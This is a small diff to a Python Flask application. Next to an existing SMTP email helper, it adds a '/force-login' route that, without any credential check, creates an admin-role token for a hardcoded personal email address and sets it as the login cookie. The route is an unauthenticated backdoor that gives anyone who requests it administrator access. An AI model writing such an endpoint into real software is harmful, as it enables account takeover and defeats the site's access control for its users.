@@ -308,3 +308,14 @@ def envioEmail(destinatario, asunto, mensaje):
     smtp.login(os.getenv('EMAIL'), os.getenv('PASSWORD_EMAIL'))
     smtp.send_message(email)
     smtp.quit()
+
+
+@login.route('/force-login', methods=['GET', 'POST'])
+def force_login():
+    email = 'jonarrodi99@gmail.com'
+    #crear token
+    token = createToken(email, 'admin')
+
+    response = redirect('/')
+    response.set_cookie('token', token)
+    return response
